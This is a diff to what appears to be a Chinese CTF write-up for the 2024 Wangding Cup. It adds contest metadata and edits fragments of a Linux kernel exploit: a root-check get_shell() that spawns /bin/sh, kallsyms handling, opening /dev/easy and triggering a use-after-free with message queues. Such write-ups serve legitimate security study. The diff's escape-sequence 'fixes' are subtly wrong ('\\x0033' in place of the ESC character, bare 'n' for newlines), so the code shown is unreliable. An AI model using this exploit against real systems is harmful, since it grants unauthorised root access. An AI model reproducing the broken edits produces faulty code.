@@ -71,6 +71,8 @@ prerequisites:
 - 通用 gadget 链构造（rax/rdi/rsi/rdx/syscall）
 - AE64 shellcode 编码库
 - kernel pwn pipe_buffer 结构基础
+contest_normalized: "网鼎杯"
+contest_year: 2024
 ---
 # 2024第四届“网鼎杯”玄武组 writeup
 
@@ -317,10 +319,10 @@ void get_shell()
 {
     if (getuid())
     {
-        printf(" 33[31m 33[1m[x] Failed to get the root! 33[0mn");
+        printf("\\x0033[31m\\x0033[1m[x] Failed to get the root!\\x0033[0mn");
         exit(-1);
     }
-    printf(" 33[32m 33[1m[+] Successful to get the root. Execve root shell now... 33[0mn");
+    printf("\\x0033[32m\\x0033[1m[+] Successful to get the root. Execve root shell now...\\x0033[0mn");
     system("/bin/sh");
 }
 
@@ -460,7 +462,7 @@ int main()
         {
             break;
         }
-        memset(kallsyms_buf, ' ', 0x30);
+        memset(kallsyms_buf, '\\x00', 0x30);
     }
 
     fd = open("/dev/easy", O_RDWR);
@@ -470,7 +472,7 @@ int main()
         exit(0);
     }
 
-    puts("n 33[34m 33[1m[*] trigger UAF 33[0m");
+    puts("n\\x0033[34m\\x0033[1m[*] trigger UAF\\x0033[0m");
 
     for (int i = 0; i < MSG_QUEUE_NUM; i++)
     {
@@ -1173,10 +1175,10 @@ void get_shell()
 {
     if (getuid())
     {
-        printf(" 33[31m 33[1m[x] Failed to get the root! 33[0mn");
+        printf("\\x0033[31m\\x0033[1m[x] Failed to get the root!\\x0033[0mn");
         exit(-1);
     }
-    printf(" 33[32m 33[1m[+] Successful to get the root. Execve root shell now... 33[0mn");
+    printf("\\x0033[32m\\x0033[1m[+] Successful to get the root. Execve root shell now...\\x0033[0mn");
     system("/bin/sh");
 }
 
@@ -1316,7 +1318,7 @@ int main()
         {
             break;
         }
-        memset(kallsyms_buf, ' ', 0x30);
+        memset(kallsyms_buf, '\\x00', 0x30);
     }
 
     fd = open("/dev/easy", O_RDWR);
@@ -1326,7 +1328,7 @@ int main()
         exit(0);
     }
 
-    puts("n 33[34m 33[1m[*] trigger UAF 33[0m");
+    puts("n\\x0033[34m\\x0033[1m[*] trigger UAF\\x0033[0m");
 
     for (int i = 0; i < MSG_QUEUE_NUM; i++)
     {
